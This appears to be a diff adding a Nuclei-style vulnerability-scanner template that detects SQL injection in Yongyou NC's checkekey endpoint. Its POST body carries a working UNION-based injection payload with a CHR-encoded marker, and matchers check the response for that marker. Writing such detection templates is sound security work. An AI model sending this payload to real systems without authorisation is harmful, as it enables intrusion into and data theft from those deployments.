@@ -1,0 +1,28 @@
+id: poc-yaml-yongyou-nc-checkekey-sqli
+info:
+  name: Yongyou NC checkekey SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in Yongyou NC's checkekey endpoint.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/portal/pt/office/checkekey?pageId=login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      user=1' UNION ALL SELECT NULL,CHR(113)||CHR(113)||CHR(112)||CHR(122)||CHR(113)||CHR(80)||CHR(103)||CHR(106)||CHR(122)||CHR(81)||CHR(70)||CHR(74)||CHR(104),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- twnX&ekey=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "qqpzqPgjzQFJh"
+          - "Error"
+          - "invalid UFDateTime"
